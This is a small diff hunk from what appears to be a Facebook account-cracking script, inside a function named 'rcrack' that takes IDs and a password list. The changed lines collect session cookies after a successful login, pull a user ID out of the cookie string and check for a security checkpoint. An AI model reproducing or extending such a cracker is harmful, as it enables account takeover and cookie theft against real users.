@@ -1078,7 +1078,7 @@ def rcrack(ids,passlist):
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid = coki[7:22]
+				uid = coki[65:80]
 				if uid in oks:pass
 				else:
 					if 'checkpoint' in str(lo):
